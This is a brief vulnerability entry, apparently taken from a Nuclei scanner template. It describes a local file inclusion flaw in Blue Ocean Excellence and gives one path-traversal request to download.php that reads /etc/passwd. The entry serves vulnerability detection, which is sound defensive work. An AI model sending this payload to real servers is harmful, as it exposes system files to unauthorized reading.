# Vulnerability: Blue Ocean Excellence - Local File Inclusion
**Classification:** CWE-23
**Source:** Nuclei Template (`blue-ocean-excellence-lfi.yaml`)

## Description
Blue Ocean Excellence is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/download.php?file=../../../../../etc/passwd
```

